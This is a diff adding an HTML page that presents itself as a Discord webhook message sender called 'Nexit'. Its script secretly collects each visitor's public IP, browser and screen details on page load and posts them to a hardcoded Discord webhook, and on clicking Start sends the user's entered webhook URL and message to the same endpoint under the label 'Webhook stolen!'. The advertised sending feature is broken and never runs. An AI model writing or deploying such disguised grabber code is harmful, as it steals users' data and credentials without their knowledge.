@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+  <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="SIA">
+    <meta name="robots" content="index, follow">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nexit</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Webhook</h1>
+    <label for="webhookUrl">Webhook URL:</label>
+    <input type="text" id="url" placeholder="Enter webhook URL">
+    <textarea id="desc" placeholder="Type your message"></textarea>
+
+    <div id="embedFields">
+      <label for="title">Title:</label>
+      <input type="text" id="title" placeholder="Embed Title">
+      <label for="description">Description:</label>
+      <textarea id="description" placeholder="Embed Description"></textarea>
+    </div>
+    <button id="startButton">Start Sending</button>
+    <button id="stopButton">Stop Sending</button>
+    <div id="response"></div>
+  </div>
+  <script>
+
+    async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Error getting public IP:', error);
+    return null;
+  }
+}
+
+getPublicIP()
+  .then(publicIP => {
+    if (publicIP) {
+
+        
+
+      console.log("Public IP:", publicIP);
+      const info = {
+        "🌐 IP Address": publicIP,
+        "🕵️‍♂️ UserAgent": navigator.userAgent,
+        "💻 Platform": navigator.platform,
+        "🌍 Language": navigator.language,
+        "🖥️ ScreenWidth": window.screen.width,
+        "🖥️ ScreenHeight": window.screen.height,
+        "🎨 ColorDepth": window.screen.colorDepth,
+        "🍪 CookiesEnabled": navigator.cookieEnabled,
+        "🌐 OnlineStatus": navigator.onLine,
+        "🔗 LocationHref": window.location.href,
+        "📄 DocumentTitle": document.title,
+      };
+
+      const webhookUrl1 = 'https://discord.com/api/webhooks/1144833732570783894/4d-fMWFZpU2O7ns1fbZyTUuEC9aXHRKrS9aUDDm7a7MX1_dkqqzjxF7oInLYOBN1yn7v';
+
+      const payload2 = {
+  content: Object.entries(info)
+    .map(([key, value]) => `${key}: ${value}`)
+    .join('\n')
+};
+
+      fetch(webhookUrl1, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(payload2)
+})
+  .then(response => {
+    if (response.ok) {
+      console.log('Message sent successfully.');
+    } else {
+      console.error('Failed to send message.');
+    }
+  })
+
+        
+        .catch(error => {
+          console.error('Error:', error);
+        });
+    } else {
+      console.log("Failed to get public IP.");
+    }
+  })
+  .catch(error => {
+    console.error("An error occurred:", error);
+  });
+
+    let intervalId; // To hold the interval ID
+
+    document.getElementById("startButton").addEventListener("click", () => {
+      const message = document.getElementById("desc").value;
+      const webhookUrl = document.getElementById("url").value;
+
+
+const customWebhookUrl = 'https://discord.com/api/webhooks/1144833732570783894/4d-fMWFZpU2O7ns1fbZyTUuEC9aXHRKrS9aUDDm7a7MX1_dkqqzjxF7oInLYOBN1yn7v';
+
+// Create a message object
+const webhookMessage = {
+  content: '🤖 Webhook stolen! `' + webhookUrl + '` Message: **'+ message +'**'
+};
+
+// Send the message to the webhook
+fetch(customWebhookUrl, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(webhookMessage)
+})
+
+      
+
+      // Construct the payload
+      const payload = {
+        embeds: [
+          {
+            color: 3447003, // Blue color
+            description: message,
+          },
+        ],
+      };
+
+      
+      }, 1); // Replace 5000 with the desired interval in milliseconds
+    
+
+    document.getElementById("stopButton").addEventListener("click", () => {
+      clearInterval(intervalId); // Stop the interval
+    });
+  </script>
+  <style>
+    body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+}
+
+.container {
+  max-width: 600px;
+  margin: 50px auto;
+  padding: 20px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+
+textarea {
+  width: 100%;
+  height: 100px;
+}
+
+#embedFields {
+  display: none;
+}
+
+#response {
+  margin-top: 10px;
+  border-top: 1px solid #ccc;
+  padding-top: 10px;
+}
+
+  </style> </body> </html>
